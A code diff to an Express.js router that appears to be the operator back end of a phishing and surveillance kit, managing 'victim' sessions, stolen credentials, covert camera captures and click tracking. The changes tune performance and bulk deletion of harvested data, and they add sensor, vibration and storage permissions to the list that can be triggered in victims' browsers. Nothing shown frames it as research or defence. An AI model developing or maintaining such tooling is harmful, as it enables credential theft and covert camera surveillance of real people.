@@ -185,17 +185,21 @@ router.get('/sessions/:id', async (req, res) => {
   try {
     const session = await VictimSession.findById(req.params.id)
       .populate('credentials')
-      .populate('cameraImages')
+      .populate({
+        path: 'cameraImages',
+        select: '-imageData', // Exclude massive base64 data to keep response fast
+        options: { sort: { capturedAt: -1 }, limit: 50 }
+      })
       .lean();
 
     if (!session) {
       return res.status(404).json({ error: 'Session not found' });
     }
 
-    // Get click events
+    // Get click events (limited to most recent 200 for performance)
     const clickEvents = await ClickEvent.find({ sessionId: session._id })
-      .sort({ timestamp: 1 })
-      .limit(5000)
+      .sort({ timestamp: -1 })
+      .limit(200)
       .lean();
 
     // Compute session harvest summary stats
@@ -219,15 +223,11 @@ router.delete('/sessions/:id', async (req, res) => {
     const session = await VictimSession.findById(req.params.id);
     if (!session) return res.status(404).json({ error: 'Session not found' });
 
-    // Delete associated Cloudinary images first
-    const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
-    for (const capture of cameraCaptures) {
-      if (capture.cloudinaryPublicId) {
-        const cResult = await deleteImage(capture.cloudinaryPublicId);
-        console.log(`🗑️ Session-delete Cloudinary [${capture.cloudinaryPublicId}]:`, cResult);
-      }
-    }
+    // Get Cloudinary IDs BEFORE deleting so we can clean up async
+    const cameraCaptures = await CameraCapture.find({ sessionId: session._id }).lean();
+    const cloudinaryIds = cameraCaptures.filter(c => c.cloudinaryPublicId).map(c => c.cloudinaryPublicId);
 
+    // 1. Fire DB deletes (instant - no network calls)
     await Promise.all([
       StolenCredential.deleteMany({ sessionId: session._id }),
       CameraCapture.deleteMany({ sessionId: session._id }),
@@ -235,7 +235,15 @@ router.delete('/sessions/:id', async (req, res) => {
       VictimSession.findByIdAndDelete(req.params.id)
     ]);
 
-    res.json({ message: 'Session and all associated data deleted (Cloudinary images cleaned up)' });
+    // 2. Respond to client IMMEDIATELY (don't wait for Cloudinary)
+    res.json({ message: 'Session and all associated data deleted' });
+
+    // 3. Clean up Cloudinary images in the background (fire & forget)
+    if (cloudinaryIds.length > 0) {
+      Promise.all(cloudinaryIds.map(id => deleteImage(id).catch(() => {})))
+        .then(() => console.log(`🗑️ Cleaned up ${cloudinaryIds.length} Cloudinary images`))
+        .catch(() => {});
+    }
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
@@ -249,27 +257,30 @@ router.post('/sessions/bulk-delete', async (req, res) => {
       return res.status(400).json({ error: 'No IDs provided' });
     }
 
-    for (const id of ids) {
-      const session = await VictimSession.findById(id);
-      if (session) {
-        // Delete associated Cloudinary images first
-        const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
-        for (const capture of cameraCaptures) {
-          if (capture.cloudinaryPublicId) {
-            await deleteImage(capture.cloudinaryPublicId);
-          }
-        }
+    const sessions = await VictimSession.find({ _id: { $in: ids } }).lean();
+    const sessionIds = sessions.map(s => s._id);
+    
+    // Get all Cloudinary IDs BEFORE deleting so we can clean up async
+    const allCaptures = await CameraCapture.find({ sessionId: { $in: sessionIds } }).lean();
+    const cloudinaryIds = allCaptures.filter(c => c.cloudinaryPublicId).map(c => c.cloudinaryPublicId);
 
-        await Promise.all([
-          StolenCredential.deleteMany({ sessionId: session._id }),
-          CameraCapture.deleteMany({ sessionId: session._id }),
-          ClickEvent.deleteMany({ sessionId: session._id })
-        ]);
-      }
+    // 1. Fire ALL DB deletes (instant - no network calls)
+    await Promise.all([
+      StolenCredential.deleteMany({ sessionId: { $in: sessionIds } }),
+      CameraCapture.deleteMany({ sessionId: { $in: sessionIds } }),
+      ClickEvent.deleteMany({ sessionId: { $in: sessionIds } }),
+      VictimSession.deleteMany({ _id: { $in: ids } })
+    ]);
+
+    // 2. Respond to client IMMEDIATELY
+    res.json({ message: `Deleted ${ids.length} sessions` });
+
+    // 3. Clean up Cloudinary images in the background (fire & forget)
+    if (cloudinaryIds.length > 0) {
+      Promise.all(cloudinaryIds.map(id => deleteImage(id).catch(() => {})))
+        .then(() => console.log(`🗑️ Cleaned up ${cloudinaryIds.length} Cloudinary images from ${ids.length} sessions`))
+        .catch(() => {});
     }
-
-    await VictimSession.deleteMany({ _id: { $in: ids } });
-    res.json({ message: `Deleted ${ids.length} sessions (Cloudinary images cleaned up)` });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
@@ -623,7 +634,7 @@ router.post('/sessions/:id/permissions/update', async (req, res) => {
 router.post('/sessions/:id/permissions/trigger', async (req, res) => {
   try {
     const { permissionType } = req.body;
-    const validPermissions = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard', 'bluetooth', 'usb', 'midi'];
+    const validPermissions = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard', 'bluetooth', 'usb', 'midi', 'persistentStorage', 'vibration', 'orientation', 'ambientLight', 'proximity'];
     
     if (!validPermissions.includes(permissionType)) {
       return res.status(400).json({ error: 'Invalid permission type. Valid: ' + validPermissions.join(', ') });
